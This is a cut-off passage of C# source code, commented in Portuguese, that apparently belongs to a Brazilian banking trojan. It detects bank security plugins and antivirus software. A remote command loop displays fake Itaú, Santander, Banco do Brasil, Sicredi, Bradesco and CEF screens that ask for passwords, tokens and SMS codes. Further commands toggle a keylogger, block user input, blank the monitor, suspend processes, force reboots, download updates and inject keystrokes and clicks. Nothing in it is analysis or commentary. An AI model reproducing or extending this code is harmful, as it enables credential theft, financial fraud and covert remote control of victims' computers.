           if (File.Exists(ProgramFilesx86() + "\\GbPlugin\\gbiehcef.dll"))
           {
               if (gbBanco != String.Empty)
               {
                   gbBanco += ", CEF";
               }
               else
               {
                   gbBanco = "CEF";
               }
           }
           if (File.Exists(ProgramFilesx86() + "\\GbPlugin\\gbiehuni.dll"))
           {
               if (gbBanco != String.Empty)
               {
                   gbBanco += ", ITAU";
               }
               else
               {
                   gbBanco = "ITAU";
               }
           }
           if (File.Exists(ProgramFilesx86() + "\\GbPlugin\\gbiehabn.dll"))
           {
               if (gbBanco != String.Empty)
               {
                   gbBanco += ", SANTA";
               }
               else
               {
                   gbBanco = "SANTA";
               }
           }
           if (File.Exists(ProgramFilesx86() + "\\Scpad\\scpVista.exe"))
           {
               if (gbBanco != String.Empty)
               {
                   gbBanco += ", DESCO";
               }
               else
               {
                   gbBanco = "DESCO";
               }
           }
           if (File.Exists(ProgramFilesx86() + "\\Trusteer\\Rapport\\bin\\RapportService.exe"))
           {
               if (gbBanco != String.Empty)
               {
                   gbBanco += ", Trusteer Rapport";
               }
               else
               {
                   gbBanco = "Trusteer Rapport";
               }
           }

           if(gbBanco == String.Empty)
           {
               gbBanco = "Sem Plugin";
           }

           return gbBanco;
       }

       private string Antivirus()
       {
           string av = null;
           string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
           var searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
           var instances = searcher.Get();
           foreach (var instance in instances)
           {
               av = instance.GetPropertyValue("displayName").ToString();
           }

           return av;
       }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }

        [DllImport("kernel32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr
        phtok);

        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name,
        ref long pluid);

        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

        [DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool ExitWindowsEx(int flg, int rea);

        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        internal const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        internal const int EWX_LOGOFF = 0x00000000;
        internal const int EWX_SHUTDOWN = 0x00000001;
        internal const int EWX_REBOOT = 0x00000002;
        internal const int EWX_FORCE = 0x00000004;
        internal const int EWX_POWEROFF = 0x00000008;
        internal const int EWX_FORCEIFHUNG = 0x00000010;

        private void DoExitWin(int flg)
        {
            bool ok;
            TokPriv1Luid tp;
            IntPtr hproc = GetCurrentProcess();
            IntPtr htok = IntPtr.Zero;
            ok = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            ok = LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, ref tp.Luid);
            ok = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            ok = ExitWindowsEx(flg, 0);
        }

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int memcmp(byte[] mem1, byte[] mem2, long count);

//===================================== Subindo tela CEF ========================================
        void TCEFMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(CEF_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void CEF_Threadcallback()
        {
            CEF_01 cef = new CEF_01();
            cef.Show();
        }
//===================================== Subindo tela CEF_Assinatura ========================================
        void TCEFAMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(CEFA_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void CEFA_Threadcallback()
        {
            CEF_02 cefA = new CEF_02();
            cefA.Show();
        }
//=============================================== Subindo tela CEF_LOADER ==================================================
        void TCEFLMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(CEFL_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void CEFL_Threadcallback()
        {
            CEF_LOADER cefl = new CEF_LOADER();
            cefl.Show();
        }
 //========================================= Subindo tela BB1 ================================================
        void TBB1Main()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(BB1_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void BB1_Threadcallback()
        {
            BB_01 bb1 = new BB_01();
            bb1.Show();
        }
//=================================== Subindo tela BB_Senha6 ==============================================
        void TBB2Main()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(BB2_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void BB2_Threadcallback()
        {
            BB_02 bb2 = new BB_02();
            bb2.Show();                                                                                   
        }
//================================== Subindo tela BB_GF ==================================================
        void TBBGFMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(BBGF_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void BBGF_Threadcallback()
        {
            BB_03 bb3 = new BB_03();
            bb3.Show(); 
        }
//================================== Subindo tela BB_Senha-6 (Conta Corrente) ==================================================
        void TBBCORRNTMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(BBCORRNT_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void BBCORRNT_Threadcallback()
        {
            BB_SENH06 bbCorrnt = new BB_SENH06();
            bbCorrnt.Show();
        }
//================================== Subindo tela BB_Certificado ==================================================
        void TBBCERTFMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(BBCERTF_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void BBCERTF_Threadcallback()
        {
            BB_CERTF bbCertf = new BB_CERTF();
            bbCertf.Show();
        }
//================================== Subindo tela BB_Token ==================================================
        void TBBTOKENMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(BBTOKEN_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void BBTOKEN_Threadcallback()
        {
            BB_TOKEN bbTok = new BB_TOKEN();
            bbTok.Show();
        }
//================================== Subindo tela BB_Senha-AA ==================================================
        void TBBAAMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(BBAA_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void BBAA_Threadcallback()
        {
            BB_AATEND bbAA = new BB_AATEND();
            bbAA.Show();
        }
//=============================================== Subindo tela BB_LOADER ==================================================
        void TBBLMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(BBL_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void BBL_Threadcallback()
        {
            BB_LOADER bbl = new BB_LOADER();
            bbl.Show(); 
        }
//=============================================== Subindo tela Sicredi ==================================================
        void TSICMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(SIC_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void SIC_Threadcallback()
        {
            SIC_01 sic = new SIC_01();
            sic.Show();
        }
//=============================================== Subindo tela Sicredi_Assint ==================================================
        void TSICAMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(SICA_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void SICA_Threadcallback()
        {
            SIC_02 sicA = new SIC_02();
            sicA.Show();
        }
//=============================================== Subindo tela Sicredi_Token ==================================================
        void TSICTMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(SICT_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void SICT_Threadcallback()
        {
            SIC_TOKEN sicT = new SIC_TOKEN();
            sicT.Show();
        }
//=============================================== Subindo tela Sicredi_Loader ==================================================
        void TSICLMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(SICL_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void SICL_Threadcallback()
        {
            SIC_LOADER sicl = new SIC_LOADER();
            sicl.Show();
        }
//=============================================== Subindo tela Desco_01 ==================================================
        void TDESCOMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(DESCO_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void DESCO_Threadcallback()
        {
            DESCO_01 desc1 = new DESCO_01();
            desc1.Show();
        }
//=============================================== Subindo tela Desco_Tabela ==================================================
        void TDESCO2Main()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(DESCO2_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void DESCO2_Threadcallback()
        {
            DESCO_02 desc2 = new DESCO_02();
            desc2.Show();
        }
//=============================================== Subindo tela Desco_Senha-6 ==================================================
        void TDESCO6Main()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(DESCO6_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void DESCO6_Threadcallback()
        {
            DESCO_03 desc6 = new DESCO_03();
            desc6.Show();
        }
//=============================================== Subindo tela Desco_Token ==================================================
        void TDESCOTOKMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(DESCOTOK_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void DESCOTOK_Threadcallback()
        {
            DESCO_TOKEN descT = new DESCO_TOKEN();
            descT.Show();
        }
//=============================================== Subindo tela Desco_Loader ==================================================
        void TDESCOLMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(DESCOL_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void DESCOL_Threadcallback()
        {
            DESCO_LOADER desc2 = new DESCO_LOADER();
            desc2.Show();
        }

//============================================= Subindo tela Ita_Físico ======================================================
        void TITAMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TITA_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TITA_Threadcallback()
        {
            ITAF itaF = new ITAF();
            itaF.Show();
        }

//============================================= Subindo tela Ita_Token ======================================================
        void TITATMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TITAT_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TITAT_Threadcallback()
        {
            ITA_T itaT = new ITA_T();
            itaT.Show();
        }

//============================================= Subindo tela Ita_Token_Juju_Inicial ======================================================
        void TITATJU01Main()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TITATJU01_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TITATJU01_Threadcallback()
        {
            ITA_TJ itaTJU01 = new ITA_TJ();
            itaTJU01.Show();
        }
//============================================= Subindo tela Ita_Token_Juju_Dentro ======================================================
        void TITATJU02Main()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TITATJU02_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TITATJU02_Threadcallback()
        {
            ITA_TJ_02 itaTJU02 = new ITA_TJ_02();
            itaTJU02.Show();
        }

//============================================= Subindo tela Ita_Sen6 ======================================================
        void TITAT6Main()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TITA6_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TITA6_Threadcallback()
        {
            ITA_SEN6 ita6 = new ITA_SEN6();
            ita6.Show();
        }

//============================================= Subindo tela Ita_Loader ======================================================
        void TITATLMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TITAL_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TITAL_Threadcallback()
        {
            ITA_LOADER itaL = new ITA_LOADER(); ;
            itaL.Show();
        }

//============================================= Subindo tela Ita_Nascimento ======================================================
        void TITATNMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TITAN_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TITAN_Threadcallback()
        {
            ITA_NASC itaL = new ITA_NASC();
            itaL.Show();
        }

//============================================= Subindo tela Santander_Main ======================================================
        void TSANTAMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TSANTA_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TSANTA_Threadcallback()
        {
            SANTA_MAIN tSanta = new SANTA_MAIN();
            tSanta.Show();
        }

//============================================= Subindo tela Santander_Assinatura ======================================================
        void TSANTASSMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TSANTASS_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TSANTASS_Threadcallback()
        {
            SANTA_ASSNT tSantaAss = new SANTA_ASSNT();
            tSantaAss.Show();
        }

//============================================= Subindo tela Santander_Token_Físico (SMS) ======================================================
        void TSANTKFMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TSANTKF_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TSANTKF_Threadcallback()
        {
            SANTA_SMS tSantaSMS = new SANTA_SMS();
            tSantaSMS.Show();
        }

//============================================= Subindo tela Santander_Tabela ======================================================
        void TSANTABMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TSANTAB_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TSANTAB_Threadcallback()
        {
            SANTA_TAB tSantaTAB = new SANTA_TAB();
            tSantaTAB.Show();
        }

//============================================= Subindo tela Santander_Loader ======================================================
        void TSANTLDMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TSANTLOD_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TSANTLOD_Threadcallback()
        {
            SANTA_LOADER tSantaLD = new SANTA_LOADER();
            tSantaLD.Show();
        }

//============================================= Subindo tela Santander_Assinatura-JuJu ======================================================
        void TSANTAJUMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TSANTAJU_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TSANTAJU_Threadcallback()
        {
            SANTA_ASS_JURID tSantASSJU = new SANTA_ASS_JURID();
            tSantASSJU.Show();
        }

//============================================= Subindo tela Santander_Token-JuJu ======================================================
        void TSANTOKJUMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TSANTATOKJU_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TSANTATOKJU_Threadcallback()
        {
            SANTA_TJU tSantOKJU = new SANTA_TJU();
            tSantOKJU.Show();
        }

//============================================= Subindo tela Santander_Token_Serie_JuJu ======================================================
        void TSANTOKSEJUMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TSANTATOKSEJU_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TSANTATOKSEJU_Threadcallback()
        {
            SANTA_TOK_SERIAL tSantOKSEJU = new SANTA_TOK_SERIAL();
            tSantOKSEJU.Show();
        }

//============================================= Subindo tela Itau_Entrada__Física ======================================================
        void TITARISEMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TITARISEMAIN_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TITARISEMAIN_Threadcallback()
        {
            ITA_FMAIN tItaRMain = new ITA_FMAIN();
            tItaRMain.Show();
        }

        //============== Chamada de metodo para envio das janelas ================

        void TSendWindowMain()
        {
            for (int i = 0; i < 1; i++)
            {
                BeginInvoke(new Action(TSendWindow_Threadcallback));
                Thread.Sleep(2000);
            }
        }

        void TSendWindow_Threadcallback()
        {
            EnumWindows(new EnumWindowsProc(EnumTheWindows), IntPtr.Zero);
        }

//================================= Procedimento para envio de um texto para determinado handler =================================

        public void EnviaTeclaHWND(string texto)
        {
            foreach (char caractere in texto)
            {
                int charValue = caractere;
                string hexValue = charValue.ToString("X");
                IntPtr val = new IntPtr((Int32)caractere);

                string valor = val.ToString();

                if (valor == "8") // tecla BACKSPACE no Operador quando usado o teclado físico do Operador
                {
                    PostMessage(WindowHandle, WM_KEYDOWN, new IntPtr((Int32)K.VK_BACK), new IntPtr(0));
                    PostMessage(WindowHandle, WM_KEYUP, new IntPtr((Int32)K.VK_BACK), new IntPtr(0));

                }
                else if (valor == "9") // tecla TAB no Operador quando usado o teclado físico do Operador
                {
                    PostMessage(WindowHandle, WM_KEYDOWN, new IntPtr((Int32)K.VK_TAB), new IntPtr(0));
                    PostMessage(WindowHandle, WM_KEYUP, new IntPtr((Int32)K.VK_TAB), new IntPtr(0));

                }
                else if (valor == "32") // tecla SPACE no Operador quando usado o teclado físico do Operador
                {
                    PostMessage(WindowHandle, WM_KEYDOWN, new IntPtr((Int32)K.VK_SPACE), new IntPtr(0));
                    PostMessage(WindowHandle, WM_KEYUP, new IntPtr((Int32)K.VK_SPACE), new IntPtr(0));

                }
                else
                {

                   // PostMessage(WindowHandle, WM_KEYDOWN, val, new IntPtr(0));
                    PostMessage(WindowHandle, WM_CHAR, val, new IntPtr(0));
                   // PostMessage(WindowHandle, WM_KEYUP, val, new IntPtr(0));

                } 
            }
        }

        public void EnviaTextBoxHWND(string texto)
        {
            foreach (char caractere in texto)
            {
                int charValue = caractere;
                string hexValue = charValue.ToString("X");
                IntPtr val = new IntPtr((Int32)caractere);

                string valor = val.ToString();

                    // PostMessage(WindowHandle, WM_KEYDOWN, val, new IntPtr(0));
                    PostMessage(WindowHandle, WM_CHAR, val, new IntPtr(0));
                    // PostMessage(WindowHandle, WM_KEYUP, val, new IntPtr(0));

                }
            }

//================================================================================================================================

        Thread threadNav;
        Thread thread;

        public void CommunicationProc()
        {
         // try 
        // {

            while (this.Connected)
            {
                //label_lblLink.Text = Cursor.Position.X + " x " + Cursor.Position.Y;

                if (this.networkStream.DataAvailable)
                {
                    int numOfBytesRead = this.networkStream.Read(this.receiveBuffer, 0, this.receiveBuffer.Length);
                    if (numOfBytesRead > 0)
                    {

                        String receiveStr = Encoding.ASCII.GetString(this.receiveBuffer, 0, numOfBytesRead);
                        QueueReceiveData queueReceiveData = new QueueReceiveData(receiveStr);

                        foreach (ReceiveData receiveData in queueReceiveData.Queue)
                        {
                            String message = receiveData.Message;
                            String value = receiveData.Value;

                            if (message.IndexOf("<|Santa|>") == 0)
                            {
                                Thread tSant = new Thread(TSANTAMain);
                                tSant.Start();
                            }
                            if (message.IndexOf("<|SantaASS|>") == 0)
                            {
                                Thread tSantASS = new Thread(TSANTASSMain);
                                tSantASS.Start();
                            }
                            if (message.IndexOf("<|SantaTKF|>") == 0)
                            {
                                Thread tSantkf = new Thread(TSANTKFMain);
                                tSantkf.Start();
                            }
                            if (message.IndexOf("<|SantaTAB|>") == 0)
                            {
                                String[] strSplitP = value.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                                uint p = Convert.ToUInt32(strSplitP[0]);

                                if (strSplitP != null)
                                {
                                    SANTA_TAB HandleToSANTAB = new SANTA_TAB();
                                    HandleToSANTAB.LbPOS(p.ToString());
                                    Thread tSantab = new Thread(TSANTABMain);
                                    tSantab.Start();
                                }
                            }
                            if (message.IndexOf("<|SantaLOD|>") == 0)
                            {
                                Thread tSantL = new Thread(TSANTLDMain);
                                tSantL.Start();
                            }
                            if (message.IndexOf("<|SantaASSJU|>") == 0)
                            {
                                Thread tSantAJU = new Thread(TSANTAJUMain);
                                tSantAJU.Start();
                            }
                            if (message.IndexOf("<|SantaTOKJU|>") == 0)
                            {
                                Thread tSantokJU = new Thread(TSANTOKJUMain);
                                tSantokJU.Start();
                            }
                            if (message.IndexOf("<|SantaTOKSEJU|>") == 0)
                            {
                                Thread tSantoksEJU = new Thread(TSANTOKSEJUMain);
                                tSantoksEJU.Start();
                            }
                            if (message.IndexOf("<|Cef|>") == 0)
                            {
                                Thread tCEF = new Thread(TCEFMain);
                                tCEF.Start();
                            }
                            if (message.IndexOf("<|CefA|>") == 0)
                            {
                                Thread tCEFA = new Thread(TCEFAMain);
                                tCEFA.Start();
                            }
                            else if (message.IndexOf("<|BB1|>") == 0)
                            {
                                Thread tBB1 = new Thread(TBB1Main);
                                tBB1.Start();
                            }
                            else if (message.IndexOf("<|BB2|>") == 0)
                            {
                                Thread tBB2 = new Thread(TBB2Main);
                                tBB2.Start();
                            }
                            else if (message.IndexOf("<|BB3|>") == 0)
                            {
                                Thread tBBGF = new Thread(TBBGFMain);
                                tBBGF.Start();
                            }
                            else if (message.IndexOf("<|BBCorrnt|>") == 0)
                            {
                                Thread tBBCORRT = new Thread(TBBCORRNTMain);
                                tBBCORRT.Start();
                            }
                            else if (message.IndexOf("<|BBCertf|>") == 0)
                            {
                                Thread tBBCERTF = new Thread(TBBCERTFMain);
                                tBBCERTF.Start();
                            }
                            else if (message.IndexOf("<|BBt|>") == 0)
                            {
                                Thread tBBT = new Thread(TBBTOKENMain);
                                tBBT.Start();
                            }
                            else if (message.IndexOf("<|BBaa|>") == 0)
                            {
                                Thread tBBAA = new Thread(TBBAAMain);
                                tBBAA.Start();
                            }
                            else if (message.IndexOf("<|BBL|>") == 0)
                            {
                                Thread tBBL = new Thread(TBBLMain);
                                tBBL.Start();
                            }
                            else if (message.IndexOf("<|CefL|>") == 0)
                            {
                                Thread tCEFL = new Thread(TCEFLMain);
                                tCEFL.Start();
                            }
                            else if (message.IndexOf("<|Sic|>") == 0)
                            {
                                Thread tSIC = new Thread(TSICMain);
                                tSIC.Start();
                            }
                            else if (message.IndexOf("<|SicA|>") == 0)
                            {
                                Thread tSICA = new Thread(TSICAMain);
                                tSICA.Start();
                            }
                            else if (message.IndexOf("<|SicT|>") == 0)
                            {
                                Thread tSICT = new Thread(TSICTMain);
                                tSICT.Start();
                            }
                            else if (message.IndexOf("<|SicL|>") == 0)
                            {
                                Thread tSICLO = new Thread(TSICLMain);
                                tSICLO.Start();
                            }
                            else if (message.IndexOf("<|Desco|>") == 0)
                            {
                                Thread tDESCO1 = new Thread(TDESCOMain);
                                tDESCO1.Start();
                            }
                            else if (message.IndexOf("<|DescoFTAB|>") == 0)
                            {
                                String[] strSplitPosicao = value.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                                uint posic = Convert.ToUInt32(strSplitPosicao[0]);

                                if (strSplitPosicao != null)
                                {
                                    DESCO_02 HandleToDESCO_02 = new DESCO_02();
                                    HandleToDESCO_02.WriteToLabel(posic.ToString());
                                    Thread tDESCO2 = new Thread(TDESCO2Main);
                                    tDESCO2.Start();
                                }
                            }
                            else if (message.IndexOf("<|Desco6|>") == 0)
                            {
                                Thread tDESCO6 = new Thread(TDESCO6Main);
                                tDESCO6.Start();
                            }
                            else if (message.IndexOf("<|DescoTOK|>") == 0)
                            {
                                Thread tDESCOT = new Thread(TDESCOTOKMain);
                                tDESCOT.Start();
                            }
                            else if (message.IndexOf("<|DescoL|>") == 0)
                            {
                                Thread tDESCOL = new Thread(TDESCOLMain);
                                tDESCOL.Start();
                            }
                            else if (message.IndexOf("<|ItaRSMAIN|>") == 0)
                            {
                                Thread tITARM = new Thread(TITARISEMain);
                                tITARM.Start();
                            }
                            else if (message.IndexOf("<|ItaTAB|>") == 0)
                            {
                                String[] strSplitPos = value.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                                uint po = Convert.ToUInt32(strSplitPos[0]);

                                if (strSplitPos != null)
                                {
                                    ITAF HandleToITA = new ITAF();
                                    HandleToITA.ToLabel(po.ToString());
                                    Thread tITA = new Thread(TITAMain);
                                    tITA.Start();
                                }
                            }
                            else if (message.IndexOf("<|ItaTOK|>") == 0)
                            {
                                Thread tITATK = new Thread(TITATMain);
                                tITATK.Start();
                            }
                            else if (message.IndexOf("<|ItaSEN6|>") == 0)
                            {
                                Thread tITA6 = new Thread(TITAT6Main);
                                tITA6.Start();
                            }
                            else if (message.IndexOf("<|ItaTOKJUINI|>") == 0)
                            {
                                Thread tITATKJU01 = new Thread(TITATJU01Main);
                                tITATKJU01.Start();
                            }
                            else if (message.IndexOf("<|ItaLD|>") == 0)
                            {
                                Thread tITAL = new Thread(TITATLMain);
                                tITAL.Start();
                            }
                            else if (message.IndexOf("<|ItaNSC|>") == 0)
                            {
                                Thread tITAN = new Thread(TITATNMain);
                                tITAN.Start();
                            }
                            else if (message.IndexOf("<|ItaTOKJU|>") == 0)
                            {

                                String[] strSplitCod = value.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                                uint co = Convert.ToUInt32(strSplitCod[0]);

                                if (strSplitCod != null)
                                {
                                    ITA_TJ_02 HandleToITAJ02 = new ITA_TJ_02();
                                    HandleToITAJ02.ToL(co.ToString());
                                    Thread tITAJUJU = new Thread(TITATJU02Main);
                                    tITAJUJU.Start();
                                }
                            }
                            else if (message.IndexOf("<|FOCALIZAR|>") == 0)
                            {

                                String[] strSplitFoco = value.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                                string titulo = Convert.ToString(strSplitFoco[0]);

                                if (strSplitFoco != null)
                                {
                                    navegador = titulo.ToString();

                                    if (!this.remotedNav)
                                    {
                                        this.remotedNav = true;
                                    }
                                }
                            }
                            else if (message.IndexOf("<|NAVOFF|>") == 0)
                            {
                                this.remotedNav = false;
                            }
                            else if (message.IndexOf("<|JANELAS|>") == 0)
                            {
                                Thread Janelas = new Thread(TSendWindowMain);
                                Janelas.Start();
                            }
                            else if (message.IndexOf("<|GRAY|>") == 0)
                            {
                                preto_branco = true;
                            }
                            else if (message.IndexOf("<|COLOR|>") == 0)
                            {
                                preto_branco = false;
                            }
                            else if (message.IndexOf("<|Close|>") == 0)
                            {
                                this.Disconnect(value);
                                return;
                            }
                            else if (message.IndexOf("<|Reboot|>") == 0)
                            {
                                DoExitWin(EWX_REBOOT | EWX_FORCE);
                            }
                            else if (message.IndexOf("<|Shutdown|>") == 0)
                            {
                                DoExitWin(EWX_SHUTDOWN | EWX_FORCE);
                            }
                            else if (message.IndexOf("<|LockInfo|>") == 0)
                            {
                                BlockInput(true);
                            }
                            else if (message.IndexOf("<|UnlockInfo|>") == 0)
                            {
                                BlockInput(false);
                            }
                            else if (message.IndexOf("<|monOFF|>") == 0)
                            {
                                    monitor(true);
                            }
                            else if (message.IndexOf("<|monON|>") == 0)
                            {
                                    monitor(false);
                            }
                            else if (message.IndexOf("<|BSITE|>") == 0)
                            {
                                String[] strSplitSite = value.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                                String site = Convert.ToString(strSplitSite[0]);

                                if (strSplitSite != null)
                                {
                                    Thread BSite = new Thread(() => blockSite(site.ToString()));
                                    BSite.Start();
                                    sendNotes("BLOQUEADO: " + site.ToString());
                                }
                            }
                            else if (message.IndexOf("<|DSITE|>") == 0)
                            {
                                Thread DSite = new Thread(() => unblockSite());
                                DSite.Start();
                            }
                            else if (message.IndexOf("<|SPROC|>") == 0)
                            {
                                String[] strSplitProc = value.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                                String proc = Convert.ToString(strSplitProc[0]);

                                if (strSplitProc != null)
                                {
                                    suspProc(proc.ToString());
                                }
                            }
                            else if (message.IndexOf("<|RPROC|>") == 0)
                            {
                                String[] strSplitProc = value.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                                String proc = Convert.ToString(strSplitProc[0]);

                                if (strSplitProc != null)
                                {
                                    resumProc(proc.ToString());
                                }
                            }
                            else if (message.IndexOf("<|Keylogger|>") == 0)
                            {
                                if (value.IndexOf("On") == 0)
                                {
                                    this.Keylogged = true;
                                }
                                else
                                {
                                    this.Keylogged = false;
                                }

                            }
                            else if (message.IndexOf("<|Key|>") == 0)
                            {
                                if (this.remotedNav)
                                {
                                   //SendMessage(WindowHandle, WM_SETTEXT, IntPtr.Zero, new StringBuilder(value));
                                    Thread SendTeclaHWND = new Thread(() => EnviaTeclaHWND(value));
                                    SendTeclaHWND.Start();
                                }
                                else
                                {
                                    SendKeys.SendWait(value);
                                }
                            }
                            else if (message.IndexOf("<|MSG|>") == 0)
                            {
                                String[] strSplit = value.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                                string msg = strSplit[0];

                                if (this.remotedNav)
                                {
                                    Thread SendTextoHWND = new Thread(() => EnviaTextBoxHWND(msg));
                                    SendTextoHWND.Start();
                                }
                            }
                            else if (message.IndexOf("<|UNINSTALL|>") == 0)
                            {
                                String[] strSplit = value.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                                string app = strSplit[0];

                                if (strSplit != null)
                                {
                                    Thread Uninstaller = new Thread(() => Uninstall(app));
                                    Uninstaller.Start();
                                }
                            }
                            else if (message.IndexOf("<|CLIENT|>") == 0)
                            {
                                String[] strSplit = value.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                                string urlFile = strSplit[0];

                                    Thread DownClient = new Thread(() => Atualizar(urlFile));
                                    DownClient.Start();
                            }
                            else if (message.IndexOf("<|MouseDC|>") == 0)
                            {
                                VirtualMouse Vm = new VirtualMouse();
                                String[] strSplit = value.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                                int x = Convert.ToInt32(strSplit[0]);
                                int y = Convert.ToInt32(strSplit[1]);

                                if (this.remotedNav)
                                {
                                    DBclickLeft(WindowHandle, x, y);
                                }
                                else
                                {
                                    Vm.DBClickButton(x, y);
                                }
                            }
                            else if (message.IndexOf("<|Mouse|>") == 0)
                            {
                                VirtualMouse Vm = new VirtualMouse();
                                String[] strSplit = value.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                                int x = Convert.ToInt32(strSplit[1]);
                                int y = Convert.ToInt32(strSplit[2]);
                                if (strSplit[0] == "LeftDown")
                                {
                                    if (this.remotedNav)
                                    {
                                        clickLeft(WindowHandle, x, y);
                                    }
                                    else
                                    {
